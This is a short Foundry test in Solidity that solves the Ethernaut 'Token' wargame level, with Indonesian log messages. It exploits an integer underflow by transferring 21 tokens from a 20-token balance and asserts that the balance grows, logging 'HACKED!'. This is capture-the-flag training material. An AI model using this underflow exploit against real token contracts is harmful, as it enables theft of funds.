// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/Token.sol";

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautTokenTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407;

    function testLevel5_Token() public {
        address player = makeAddr("player");
        vm.deal(player, 1 ether);
        
        vm.startPrank(player);
        Token token = new Token(20); 
        
        console.log("Saldo Awal Player:", token.balanceOf(player));

        address stranger = makeAddr("stranger");
        console.log("Mencoba transfer 21 token (padahal cuma punya 20)...");
        
        token.transfer(stranger, 21);

        uint finalBalance = token.balanceOf(player);
        console.log("Saldo Akhir Player:", finalBalance);

        assertGt(finalBalance, 20);
        console.log("HACKED! Infinite Money Glitch Berhasil.");
        
        vm.stopPrank();
    }
    
    function testScript_AttackOnSepolia() public {
    }
}